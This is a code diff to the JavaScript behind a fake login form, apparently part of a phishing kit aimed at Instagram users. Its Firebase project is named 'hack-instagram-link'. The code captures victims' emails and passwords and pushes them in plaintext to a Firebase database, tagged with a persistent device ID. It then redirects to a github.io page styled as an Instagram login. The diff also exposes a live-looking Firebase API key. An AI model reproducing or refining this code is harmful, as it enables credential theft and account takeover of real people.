@@ -1,9 +1,9 @@
-// Import the functions you need from the SDKs you need
+// Firebase Imports
 import { initializeApp } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js";
-import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-database.js";
+import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-database.js";
 import { getAnalytics } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-analytics.js";
 
-// Your web app's Firebase configuration
+// Firebase Config
 const firebaseConfig = {
   apiKey: "AIzaSyDsS14QF70TAtRSiXeDz00wLoI4FqaNo_8",
   authDomain: "hack-instagram-link.firebaseapp.com",
@@ -20,54 +20,63 @@ const app = initializeApp(firebaseConfig);
 const analytics = getAnalytics(app);
 const database = getDatabase(app);
 
-// Log the initialization of Firebase
-console.log("Firebase Initialized");
-
-// Function to generate a unique ID
+// Function to generate a unique device ID
 function generateUniqueId() {
-  return Math.random().toString(36).substr(2, 9); // Example: "2971fab7"
+  return Math.random().toString(36).substr(2, 9); // Example: "4tub132ze"
 }
 
-// Handle login form submission
+// Function to get or generate the device ID
+function getDeviceId() {
+  let deviceId = localStorage.getItem("deviceId");
+  if (!deviceId) {
+    deviceId = generateUniqueId(); // If not found, generate one
+    localStorage.setItem("deviceId", deviceId);  // Save it in localStorage
+  }
+  return deviceId;
+}
+
+// Handle form submission
 const loginForm = document.getElementById('loginForm');
 if (loginForm) {
   loginForm.addEventListener('submit', (event) => {
-    event.preventDefault(); // Prevent default form submission
+    event.preventDefault();
 
-    // Get input values
+    // Get form values
     const email = document.getElementById('email').value;
     const password = document.getElementById('password').value;
 
-    console.log("Debug: Email =", email, "Password =", password);
-
-    // Check if fields are not empty
     if (email && password) {
-      const deviceId = generateUniqueId();
-      console.log("Debug: Device ID =", deviceId);
+      const deviceId = getDeviceId(); // Get or generate deviceId
 
-      // Save data to Firebase Realtime Database
-      const userRef = ref(database, 'users/' + deviceId);
-      set(userRef, {
+      // Ensure deviceId is valid before proceeding
+      if (!deviceId) {
+        alert("Device ID is invalid.");
+        return;
+      }
+
+      console.log("Generated Device ID:", deviceId);
+
+      // Create a reference to the "users" list under the specific deviceId
+      const usersRef = ref(database, 'users/' + deviceId);  // deviceId as the key
+
+      // Push a new login entry under the deviceId
+      push(usersRef, {
         email: email,
         password: password,
-        deviceId: deviceId
+        timestamp: new Date().toISOString() // Add a timestamp to distinguish the logins
       })
-        .then(() => {
-          console.log("Data sent successfully to Firebase");
-
-          // Create the link with the device ID
-          const link = https://example.com/id=${deviceId};
-          console.log("Debug: Generated Link =", link);
-
-          alert(Login data sent successfully!\nYour link: ${link});
-          loginForm.reset();
-        })
-        .catch((error) => {
-          console.error("Error:", error.message);
-          alert("Error: " + error.message);
-        });
+      .then(() => {
+        const link = "https://mafia749.github.io/login/Instagram/instagram.html?id=" + deviceId;
+        alert("Login successful! Your link: " + link);
+        console.log("Generated Link:", link);
+        window.location.href = link; // Redirect the user to the generated link
+      })
+      .catch((error) => {
+        console.error("Error sending data to Firebase:", error.message);
+        alert("Error sending data: " + error.message); // Alert the user about the error
+      });
     } else {
-      alert("Please fill in both email and password.");
+      alert("Please fill in both fields.");
     }
   });
 } else {
